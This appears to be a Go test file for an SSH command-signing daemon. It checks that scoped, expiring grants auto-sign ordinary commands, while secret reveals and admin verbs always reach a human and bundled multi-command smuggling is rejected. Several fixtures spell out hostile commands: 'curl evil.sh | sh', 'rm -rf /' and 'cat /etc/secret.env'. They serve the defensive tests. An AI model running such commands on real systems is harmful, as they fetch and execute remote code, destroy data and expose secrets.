package signer_test

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/karthikeyan5/sshgate/src/signer"
	"github.com/karthikeyan5/sshgate/src/signer/backend"
	"github.com/karthikeyan5/sshgate/src/sigwire"
)

// clock is a mutable test clock so a single test can advance time across
// a grant's expiry boundary. newDaemon pins a fixed clock; grant-expiry
// tests build the Daemon directly with this instead.
type clock struct {
	mu sync.Mutex
	t  time.Time
}

func (c *clock) now() time.Time {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.t
}

func (c *clock) set(t time.Time) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.t = t
}

// newGrantDaemon builds a Daemon with the given backend and a mutable
// clock starting at base. Mirrors newDaemon's audit/key wiring.
func newGrantDaemon(t *testing.T, bk backend.Backend, base time.Time) (*signer.Daemon, ed25519.PublicKey, *signer.AuditLog, string, *clock) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("genkey: %v", err)
	}
	auditPath := filepath.Join(t.TempDir(), "audit.log")
	audit, err := signer.OpenAuditLog(auditPath)
	if err != nil {
		t.Fatalf("open audit: %v", err)
	}
	clk := &clock{t: base}
	d := &signer.Daemon{
		Key:     priv,
		Backend: bk,
		Audit:   audit,
		NowFunc: clk.now,
	}
	return d, pub, audit, auditPath, clk
}

// grantResp is the decoded request_grant response shape.
type grantResp struct {
	RequestID  string `json:"request_id"`
	Status     string `json:"status"`
	GrantID    string `json:"grant_id"`
	ExpiryUnix int64  `json:"expiry_unix"`
	Error      string `json:"error"`
}

// grantSignResp is the decoded sign response shape. AuthMode is the F4
// human-vs-grant marker the daemon now stamps on the socket response
// (the approver name still lives only in the audit, read via approverFor).
type grantSignResp struct {
	RequestID  string `json:"request_id"`
	Status     string `json:"status"`
	AuthMode   string `json:"auth_mode"`
	Signatures []struct {
		Cmd string `json:"cmd"`
		Sig string `json:"sig"`
	} `json:"signatures"`
	Error string `json:"error"`
}

// authModeFor scans the audit log for the row matching reqID and returns its
// auth_mode — the F4-B4 first-class HOW field on the signer's authoritative
// log, decoupled from approved_by (WHO).
func authModeFor(t *testing.T, auditPath, reqID string) string {
	t.Helper()
	for _, ev := range readAudit(t, auditPath) {
		if ev.RequestID == reqID {
			return ev.AuthMode
		}
	}
	t.Fatalf("no audit row for request_id %q", reqID)
	return ""
}

// createGrant drives the real request_grant path through the daemon and
// returns the decoded response. The backend approval for reqID must be
// pre-armed by the caller (e.g. mock.Approve(reqID, "karthi")).
func createGrant(t *testing.T, d *signer.Daemon, reqID, alias, scope string, commands []string, durationSec int64) grantResp {
	t.Helper()
	body := map[string]any{
		"kind":             "request_grant",
		"request_id":       reqID,
		"alias":            alias,
		"scope":            scope,
		"duration_seconds": durationSec,
	}
	if len(commands) > 0 {
		body["commands"] = commands
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal grant req: %v", err)
	}
	conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
	if err := d.HandleSignRequest(context.Background(), conn); err != nil {
		t.Fatalf("HandleSignRequest(request_grant): %v", err)
	}
	var resp grantResp
	if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &resp); err != nil {
		t.Fatalf("decode grant resp: %v\nraw=%q", err, conn.out.String())
	}
	return resp
}

// signOne drives a single-command sign request and returns the decoded
// response. host/reveal/reason are optional.
func signOne(t *testing.T, d *signer.Daemon, reqID, alias, cmd, host string, reveal bool, reason string) grantSignResp {
	t.Helper()
	cmdObj := map[string]any{
		"server":      alias,
		"cmd":         cmd,
		"ttl_seconds": 60,
	}
	if host != "" {
		cmdObj["host"] = host
	}
	if reveal {
		cmdObj["reveal"] = true
		cmdObj["reason"] = reason
	}
	body := map[string]any{
		"kind":       "sign",
		"request_id": reqID,
		"commands":   []any{cmdObj},
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal sign req: %v", err)
	}
	conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
	if err := d.HandleSignRequest(context.Background(), conn); err != nil {
		t.Fatalf("HandleSignRequest(sign): %v", err)
	}
	var resp grantSignResp
	if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &resp); err != nil {
		t.Fatalf("decode sign resp: %v\nraw=%q", err, conn.out.String())
	}
	return resp
}

// approverFor scans the audit log for the row matching reqID and returns
// its approved_by — this is how we distinguish an auto-signed grant
// ("grant:<id>") from a human-prompted approval ("karthi").
func approverFor(t *testing.T, auditPath, reqID string) string {
	t.Helper()
	for _, ev := range readAudit(t, auditPath) {
		if ev.RequestID == reqID {
			return ev.ApprovedBy
		}
	}
	t.Fatalf("no audit row for request_id %q", reqID)
	return ""
}

const grantHost = "SHA256:grantTestHostKeyFingerprintAAAAAAAAAAAAAAAA"

// TestSignRequest_AdminVerbMustBeSoleCommand pins the lone-admin-verb invariant:
// a sign request that bundles an SSHGATE_ admin verb (SSHGATE_UPDATE /
// SSHGATE_REVOKE) with ANY sibling command is rejected at the request layer —
// BEFORE any prompt or signature — so a crafted multi-command request can never
// smuggle hidden writes/reveals behind the single-command "GATE UPDATE" approval
// banner (which renders only commands[0]). A normal multi-write batch with no
// admin verb is unaffected, proving the guard does not over-reach.
func TestSignRequest_AdminVerbMustBeSoleCommand(t *testing.T) {
	t.Parallel()
	const updateHash = "SSHGATE_UPDATE aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" // 64 hex

	// signMulti sends a raw multi-command sign request (the shape a crafted
	// client — not update_gate, which always sends one command — could send).
	signMulti := func(t *testing.T, d *signer.Daemon, reqID string, cmds []string) grantSignResp {
		t.Helper()
		var arr []any
		for _, c := range cmds {
			arr = append(arr, map[string]any{"server": "prod", "cmd": c, "ttl_seconds": 60, "host": grantHost})
		}
		body := map[string]any{"kind": "sign", "request_id": reqID, "commands": arr}
		raw, err := json.Marshal(body)
		if err != nil {
			t.Fatalf("marshal: %v", err)
		}
		conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
		if err := d.HandleSignRequest(context.Background(), conn); err != nil {
			t.Fatalf("HandleSignRequest: %v", err)
		}
		var resp grantSignResp
		if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &resp); err != nil {
			t.Fatalf("decode resp: %v raw=%q", err, conn.out.String())
		}
		return resp
	}

	rejectCases := map[string][]string{
		"update + hidden write": {updateHash, "curl evil.sh | sh"},
		"hidden write + update": {"curl evil.sh | sh", updateHash},
		"revoke + hidden write": {"SSHGATE_REVOKE", "rm -rf /"},
		"update + revoke":       {updateHash, "SSHGATE_REVOKE"},
	}
	for name, cmds := range rejectCases {
		name, cmds := name, cmds
		t.Run("reject: "+name, func(t *testing.T) {
			t.Parallel()
			mock := backend.NewMockBackend()
			d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
			defer audit.Close()
			// Arm the mock so that IF the guard were removed, the request would be
			// APPROVED + signed — turning a regression into a clean assertion
			// failure below (status=approved / sigs>0) rather than a hang.
			mock.Approve("r_reject", "karthi")
			resp := signMulti(t, d, "r_reject", cmds)
			if resp.Status == "approved" || len(resp.Signatures) > 0 {
				t.Fatalf("multi-command request with an admin verb was signed (status=%q sigs=%d) — smuggling NOT rejected", resp.Status, len(resp.Signatures))
			}
			if !strings.Contains(resp.Error, "admin verb") {
				t.Errorf("error = %q; want it to name the admin-verb invariant", resp.Error)
			}
		})
	}

	// A normal multi-write batch (no admin verb) must NOT be caught by the guard:
	// it proceeds to a human prompt and signs both.
	t.Run("normal 2-write batch unaffected", func(t *testing.T) {
		t.Parallel()
		mock := backend.NewMockBackend()
		d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
		defer audit.Close()
		mock.Approve("r_batch", "karthi")
		resp := signMulti(t, d, "r_batch", []string{"systemctl restart nginx", "systemctl restart redis"})
		if resp.Status != "approved" {
			t.Fatalf("normal 2-write batch status=%q; want approved (err=%q) — guard over-reached", resp.Status, resp.Error)
		}
		if len(resp.Signatures) != 2 {
			t.Errorf("got %d sigs; want 2", len(resp.Signatures))
		}
	})
}

// TestGrant_ScopeAll_AutoSignsWithoutPrompt is the core auto-approve
// happy path: after a scope=all grant on an alias, a subsequent write on
// that alias auto-signs WITHOUT consulting the backend. We prove "no
// prompt" by leaving the sign request's reqID UNARMED on the mock — if
// the daemon prompted, the unarmed channel would never resolve and the
// test would hang to the package timeout (a loud failure). The approver
// in the audit log is "grant:<id>", confirming the grant path.
func TestGrant_ScopeAll_AutoSignsWithoutPrompt(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, pub, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved (err=%q)", gr.Status, gr.Error)
	}
	if gr.GrantID == "" {
		t.Fatal("grant_id empty on approval")
	}

	// Sign reqID is NOT armed — only a grant auto-approve can resolve it.
	resp := signOne(t, d, "s_auto", "prod", "systemctl restart nginx", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("sign status = %q; want approved", resp.Status)
	}
	if len(resp.Signatures) != 1 {
		t.Fatalf("got %d sigs; want 1", len(resp.Signatures))
	}
	// The auto-signed signature must verify under the daemon key.
	sig, payload, err := sigwire.DecodeSigned(resp.Signatures[0].Sig)
	if err != nil {
		t.Fatalf("decode sig: %v", err)
	}
	signedBytes, _ := json.Marshal(payload)
	if !ed25519.Verify(pub, signedBytes, sig) {
		t.Error("auto-signed signature does not verify")
	}
	if payload.Host != grantHost {
		t.Errorf("payload.Host = %q; want %q (host-binding preserved under a grant)", payload.Host, grantHost)
	}
	// Audit proves the grant path (not a human prompt).
	if got := approverFor(t, auditPath, "s_auto"); !strings.HasPrefix(got, "grant:") {
		t.Errorf("approved_by = %q; want grant:<id> (auto-approved)", got)
	}
}

// TestGrant_AuthModeOnSignResponseAndAudit pins F4: a grant auto-sign carries
// auth_mode="grant:<id>" on BOTH the socket response and the signer audit;
// a human-tap sign carries auth_mode="human" on both. The socket response is
// the new single-surface human-vs-grant field (gate-invisible, signature
// unchanged); the audit's auth_mode is the same value via the shared helper.
func TestGrant_AuthModeOnSignResponseAndAudit(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	// Grant auto-sign path.
	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved (err=%q)", gr.Status, gr.Error)
	}
	// Sign reqID UNARMED — only the grant can resolve it.
	auto := signOne(t, d, "s_auto", "prod", "systemctl restart nginx", grantHost, false, "")
	if auto.Status != "approved" {
		t.Fatalf("auto sign status = %q; want approved", auto.Status)
	}
	// Socket response auth_mode is exactly "grant:<grant_id>" — the same
	// "grant:<id>" string approved_by carries (the shared helper returns it
	// verbatim). createGrant returns the bare id, so prefix it here.
	wantGrantMode := "grant:" + gr.GrantID
	if auto.AuthMode != wantGrantMode {
		t.Errorf("auto sign-response auth_mode = %q; want %q", auto.AuthMode, wantGrantMode)
	}
	// approved_by carries the same value, and the audit's first-class
	// auth_mode equals it — proving the response and the audit never drift.
	if got := approverFor(t, auditPath, "s_auto"); got != wantGrantMode {
		t.Errorf("auto approved_by = %q; want %q", got, wantGrantMode)
	}
	if got := authModeFor(t, auditPath, "s_auto"); got != wantGrantMode {
		t.Errorf("auto audit auth_mode = %q; want %q (must equal the socket response)", got, wantGrantMode)
	}

	// Human-tap path (different alias so no grant covers it).
	mock.Approve("s_human", "karthi")
	human := signOne(t, d, "s_human", "other", "rm /tmp/x", grantHost, false, "")
	if human.Status != "approved" {
		t.Fatalf("human sign status = %q; want approved", human.Status)
	}
	if human.AuthMode != "human" {
		t.Errorf("human sign-response auth_mode = %q; want human", human.AuthMode)
	}
	if got := authModeFor(t, auditPath, "s_human"); got != "human" {
		t.Errorf("human audit auth_mode = %q; want human", got)
	}
}

// TestGrant_ScopeCommands_ExactMatchOnly pins exact-string scope: the
// exact command auto-signs; a near-miss (extra arg) and a different alias
// both fall through to the human prompt.
func TestGrant_ScopeCommands_ExactMatchOnly(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "src", "commands", []string{"systemctl stop app"}, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved", gr.Status)
	}

	// Exact match → auto-signs (reqID unarmed, only grant can resolve it).
	resp := signOne(t, d, "s_exact", "src", "systemctl stop app", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("exact-match sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_exact"); !strings.HasPrefix(got, "grant:") {
		t.Errorf("exact match approved_by = %q; want grant:<id>", got)
	}

	// Near-miss (extra arg) → must prompt. Arm the reqID so the prompt
	// resolves, then assert the approver is the HUMAN, not the grant.
	mock.Approve("s_near", "karthi")
	resp = signOne(t, d, "s_near", "src", "systemctl stop app --now", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("near-miss sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_near"); got != "karthi" {
		t.Errorf("near-miss approved_by = %q; want human \"karthi\" (NOT auto-signed)", got)
	}

	// Different alias, exact command → must prompt (grant is per-alias).
	mock.Approve("s_otheralias", "karthi")
	resp = signOne(t, d, "s_otheralias", "other", "systemctl stop app", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("other-alias sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_otheralias"); got != "karthi" {
		t.Errorf("other-alias approved_by = %q; want human (grant is per-alias)", got)
	}
}

// TestGrant_RevealNeverAutoSigned is the critical security test: even
// under a scope=all grant, a SECRET-REVEAL request must ALWAYS prompt the
// human — a grant must never auto-sign a reveal. We arm the human prompt
// and assert the approver is the human (not the grant) AND that the
// signed payload still carries reveal=true.
func TestGrant_RevealNeverAutoSigned(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved", gr.Status)
	}

	// A reveal on the SAME alias the scope=all grant covers. It must
	// prompt — so arm the human approval; if the grant auto-signed it,
	// the approver would be "grant:..." instead.
	mock.Approve("s_reveal", "karthi")
	resp := signOne(t, d, "s_reveal", "prod", "cat /etc/secret.env", grantHost, true, "debugging auth")
	if resp.Status != "approved" {
		t.Fatalf("reveal sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_reveal"); got != "karthi" {
		t.Fatalf("reveal approved_by = %q; want human \"karthi\" — a grant MUST NOT auto-sign a reveal", got)
	}
	// The signed payload must still carry reveal=true (the human approved
	// a reveal, not a plain write).
	_, payload, err := sigwire.DecodeSigned(resp.Signatures[0].Sig)
	if err != nil {
		t.Fatalf("decode sig: %v", err)
	}
	if !payload.Reveal {
		t.Error("payload.Reveal = false; want true (reveal must survive the prompt path)")
	}
}

// TestGrant_AdminVerbNeverAutoSigned is the SSHGATE_UPDATE security test:
// even under a scope=all grant, an administrative verb (SSHGATE_UPDATE /
// SSHGATE_REVOKE) must ALWAYS prompt the human — a grant must never
// auto-sign a gate-replacement or a gate-teardown. The gate dispatches on
// the command PREFIX regardless of which signer path minted the signature,
// so this signer-side carve-out is the ONLY control that stops a scope=all
// grant from silently authorizing an admin verb (see
// docs/proposed/sshgate-update-verb-2026-07.md Finding 1). A benign write on
// the same alias must STILL auto-sign — the carve-out must not over-reach.
func TestGrant_AdminVerbNeverAutoSigned(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved", gr.Status)
	}

	// Each admin verb on the SAME alias the scope=all grant covers must
	// PROMPT — arm the human approval; if the grant auto-signed it, the
	// approver would be "grant:..." instead of the human name.
	adminCmds := map[string]string{
		"s_update": "SSHGATE_UPDATE 3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b",
		"s_revoke": "SSHGATE_REVOKE",
	}
	for reqID, cmd := range adminCmds {
		mock.Approve(reqID, "karthi")
		resp := signOne(t, d, reqID, "prod", cmd, grantHost, false, "")
		if resp.Status != "approved" {
			t.Fatalf("%s sign status = %q; want approved", reqID, resp.Status)
		}
		if got := approverFor(t, auditPath, reqID); got != "karthi" {
			t.Fatalf("%s (%q) approved_by = %q; want human \"karthi\" — a grant MUST NOT auto-sign an admin verb", reqID, cmd, got)
		}
	}

	// Control: a benign write on the SAME alias STILL auto-signs (the
	// carve-out must not disable grants for ordinary commands). reqID
	// UNARMED — only the grant can resolve it.
	resp := signOne(t, d, "s_benign", "prod", "systemctl restart nginx", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("benign sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_benign"); !strings.HasPrefix(got, "grant:") {
		t.Errorf("benign approved_by = %q; want grant:<id> (carve-out must not over-reach)", got)
	}
}

// TestGrant_CrossServer pins that a grant for alias X never auto-signs a
// command aimed at alias Y.
func TestGrant_CrossServer(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	createGrant(t, d, "g_req", "X", "all", nil, 3600)

	mock.Approve("s_y", "karthi")
	resp := signOne(t, d, "s_y", "Y", "rm -rf /tmp/x", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("cross-server sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_y"); got != "karthi" {
		t.Errorf("cross-server approved_by = %q; want human (grant for X must not cover Y)", got)
	}
}

// TestGrant_Expired pins that once a grant's window elapses, a matching
// command prompts again (the signer never auto-signs past expiry).
func TestGrant_Expired(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	base := time.Unix(1000, 0)
	d, _, audit, auditPath, clk := newGrantDaemon(t, mock, base)
	defer audit.Close()

	// 1h grant minted at base.
	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved", gr.Status)
	}

	// Advance past expiry (base + 1h + 1s).
	clk.set(base.Add(3601 * time.Second))

	mock.Approve("s_expired", "karthi")
	resp := signOne(t, d, "s_expired", "prod", "systemctl restart nginx", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("post-expiry sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_expired"); got != "karthi" {
		t.Errorf("post-expiry approved_by = %q; want human (expired grant must not auto-sign)", got)
	}
}

// TestGrant_FreshDaemonHasNoGrants pins the in-memory / restart-drops
// property: a daemon with no grant created auto-signs nothing — every
// write prompts.
func TestGrant_FreshDaemonHasNoGrants(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("s_fresh", "karthi")
	resp := signOne(t, d, "s_fresh", "prod", "systemctl restart nginx", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("fresh-daemon sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_fresh"); got != "karthi" {
		t.Errorf("fresh-daemon approved_by = %q; want human (no grants exist by default)", got)
	}
}

// TestGrant_DeniedNotStored pins that a backend-denied request_grant
// stores no grant — a subsequent matching write still prompts.
func TestGrant_DeniedNotStored(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Deny("g_req")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "denied" {
		t.Fatalf("grant status = %q; want denied", gr.Status)
	}
	if gr.GrantID != "" {
		t.Errorf("grant_id = %q; want empty on denial", gr.GrantID)
	}

	mock.Approve("s_afterdeny", "karthi")
	resp := signOne(t, d, "s_afterdeny", "prod", "systemctl restart nginx", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_afterdeny"); got != "karthi" {
		t.Errorf("approved_by = %q; want human (denied grant must store nothing)", got)
	}
}

// TestGrant_CreationValidation is the request_grant validation table:
// duration ceiling, non-positive duration, bad scope, empty command set.
func TestGrant_CreationValidation(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name        string
		scope       string
		commands    []string
		durationSec int64
		wantErrSub  string
	}{
		{"duration over 24h", "all", nil, 86401, "24h"},
		{"duration zero", "all", nil, 0, "duration_seconds must be > 0"},
		{"duration negative", "all", nil, -1, "duration_seconds must be > 0"},
		{"invalid scope", "everything", nil, 3600, "invalid scope"},
		{"commands scope empty list", "commands", nil, 3600, "requires a non-empty commands list"},
		{"all scope with commands", "all", []string{"ls"}, 3600, "must not carry a commands list"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			mock := backend.NewMockBackend()
			d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
			defer audit.Close()

			// No mock arming — these must be rejected BEFORE the backend.
			gr := createGrant(t, d, "g_bad", "prod", tc.scope, tc.commands, tc.durationSec)
			if gr.Status != "error" {
				t.Fatalf("status = %q; want error (%s)", gr.Status, tc.name)
			}
			if !strings.Contains(gr.Error, tc.wantErrSub) {
				t.Errorf("error = %q; want substring %q", gr.Error, tc.wantErrSub)
			}
		})
	}
}

// TestGrant_BoundaryExact24hAllowed pins the inclusive ceiling: a grant of
// exactly 24h (86400s) is allowed; the 86401 rejection above is a true
// boundary, not an off-by-one.
func TestGrant_BoundaryExact24hAllowed(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_24h", "karthi")
	gr := createGrant(t, d, "g_24h", "prod", "all", nil, 86400)
	if gr.Status != "approved" {
		t.Fatalf("status = %q; want approved (exactly 24h is allowed) err=%q", gr.Status, gr.Error)
	}
}

// TestGrant_Revoke pins that revoke_grant drops the grant: a matching
// write that auto-signed before revoke prompts again after.
func TestGrant_Revoke(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, auditPath, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	createGrant(t, d, "g_req", "prod", "all", nil, 3600)

	// Before revoke: auto-signs (unarmed sign reqID).
	resp := signOne(t, d, "s_before", "prod", "systemctl restart nginx", grantHost, false, "")
	if got := approverFor(t, auditPath, "s_before"); !strings.HasPrefix(got, "grant:") {
		t.Fatalf("pre-revoke approved_by = %q; want grant:<id>", got)
	}
	_ = resp

	// Revoke (no approval needed; never touches the backend).
	revBody := map[string]any{"kind": "revoke_grant", "request_id": "rv_req", "alias": "prod"}
	raw, _ := json.Marshal(revBody)
	conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
	if err := d.HandleSignRequest(context.Background(), conn); err != nil {
		t.Fatalf("HandleSignRequest(revoke_grant): %v", err)
	}
	var rv revokeGrantResp
	if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &rv); err != nil {
		t.Fatalf("decode revoke resp: %v\nraw=%q", err, conn.out.String())
	}
	if rv.Status != "approved" {
		t.Fatalf("revoke status = %q; want approved", rv.Status)
	}

	// After revoke: must prompt again.
	mock.Approve("s_after", "karthi")
	resp = signOne(t, d, "s_after", "prod", "systemctl restart nginx", grantHost, false, "")
	if resp.Status != "approved" {
		t.Fatalf("post-revoke sign status = %q; want approved", resp.Status)
	}
	if got := approverFor(t, auditPath, "s_after"); got != "karthi" {
		t.Errorf("post-revoke approved_by = %q; want human (grant was revoked)", got)
	}
}

// revokeGrantResp is the decoded revoke_grant response shape.
type revokeGrantResp struct {
	RequestID string `json:"request_id"`
	Status    string `json:"status"`
	Error     string `json:"error"`
}

// TestGrant_ByteIdenticalToHumanApproved pins the gate-unchanged
// invariant: an auto-signed payload and a human-approved payload for the
// SAME (command, host, ttl) are identical in every field except the
// random Nonce, and both verify under the daemon key. This is what lets
// the gate stay completely unaware of grants.
func TestGrant_ByteIdenticalToHumanApproved(t *testing.T) {
	t.Parallel()
	base := time.Unix(1000, 0)

	// Human-approved sign (no grant).
	mock1 := backend.NewMockBackend()
	dH, pubH, auditH, _, _ := newGrantDaemon(t, mock1, base)
	defer auditH.Close()
	mock1.Approve("s_human", "karthi")
	human := signOne(t, dH, "s_human", "prod", "systemctl restart nginx", grantHost, false, "")
	if human.Status != "approved" {
		t.Fatalf("human sign status = %q; want approved", human.Status)
	}

	// Grant-auto-signed sign on a fresh daemon at the SAME clock.
	mock2 := backend.NewMockBackend()
	dG, pubG, auditG, auditPathG, _ := newGrantDaemon(t, mock2, base)
	defer auditG.Close()
	mock2.Approve("g_req", "karthi")
	createGrant(t, dG, "g_req", "prod", "all", nil, 3600)
	auto := signOne(t, dG, "s_auto", "prod", "systemctl restart nginx", grantHost, false, "")
	if auto.Status != "approved" {
		t.Fatalf("auto sign status = %q; want approved", auto.Status)
	}
	if got := approverFor(t, auditPathG, "s_auto"); !strings.HasPrefix(got, "grant:") {
		t.Fatalf("auto approved_by = %q; want grant:<id>", got)
	}

	_, ph, err := sigwire.DecodeSigned(human.Signatures[0].Sig)
	if err != nil {
		t.Fatalf("decode human: %v", err)
	}
	_, pg, err := sigwire.DecodeSigned(auto.Signatures[0].Sig)
	if err != nil {
		t.Fatalf("decode auto: %v", err)
	}

	if ph.Cmd != pg.Cmd {
		t.Errorf("Cmd differs: %q vs %q", ph.Cmd, pg.Cmd)
	}
	if ph.TS != pg.TS {
		t.Errorf("TS differs: %d vs %d", ph.TS, pg.TS)
	}
	if ph.Exp != pg.Exp {
		t.Errorf("Exp differs: %d vs %d", ph.Exp, pg.Exp)
	}
	if ph.Host != pg.Host {
		t.Errorf("Host differs: %q vs %q", ph.Host, pg.Host)
	}
	if ph.Reveal != pg.Reveal {
		t.Errorf("Reveal differs: %v vs %v", ph.Reveal, pg.Reveal)
	}
	// Nonce is the ONLY field expected to differ (independent randomness).
	if ph.Nonce == pg.Nonce {
		t.Error("Nonce identical across two signs; want independent random nonces")
	}
	// Both verify under their respective keys (the per-daemon keys differ,
	// but the payload SHAPE is identical — that's the invariant).
	hb, _ := json.Marshal(ph)
	if !ed25519.Verify(pubH, hb, mustSig(t, human.Signatures[0].Sig)) {
		t.Error("human signature does not verify")
	}
	gb, _ := json.Marshal(pg)
	if !ed25519.Verify(pubG, gb, mustSig(t, auto.Signatures[0].Sig)) {
		t.Error("auto signature does not verify")
	}
}

func mustSig(t *testing.T, wire string) []byte {
	t.Helper()
	sig, _, err := sigwire.DecodeSigned(wire)
	if err != nil {
		t.Fatalf("decode sig: %v", err)
	}
	return sig
}

// listGrantsResp is the decoded list_grants response shape.
type listGrantsResp struct {
	RequestID    string `json:"request_id"`
	Status       string `json:"status"`
	ProtoVersion int    `json:"proto_version"`
	Error        string `json:"error"`
	Grants       []struct {
		Alias      string   `json:"alias"`
		Scope      string   `json:"scope"`
		Commands   []string `json:"commands"`
		GrantID    string   `json:"grant_id"`
		ExpiryUnix int64    `json:"expiry_unix"`
	} `json:"grants"`
}

// listGrants drives the real list_grants path through the daemon and
// returns the decoded response. alias is optional ("" = all).
func listGrants(t *testing.T, d *signer.Daemon, reqID, alias string) listGrantsResp {
	t.Helper()
	body := map[string]any{
		"kind":       "list_grants",
		"request_id": reqID,
	}
	if alias != "" {
		body["alias"] = alias
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal list req: %v", err)
	}
	conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
	if err := d.HandleSignRequest(context.Background(), conn); err != nil {
		t.Fatalf("HandleSignRequest(list_grants): %v", err)
	}
	var resp listGrantsResp
	if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &resp); err != nil {
		t.Fatalf("decode list resp: %v\nraw=%q", err, conn.out.String())
	}
	return resp
}

// TestListGrants_ReportsLiveGrant pins the core read-only path: after a
// grant is minted, list_grants returns it with the exact grant_id, scope,
// commands, and expiry the daemon recorded.
func TestListGrants_ReportsLiveGrant(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	base := time.Unix(1000, 0)
	d, _, audit, _, _ := newGrantDaemon(t, mock, base)
	defer audit.Close()

	mock.Approve("g_req", "karthi")
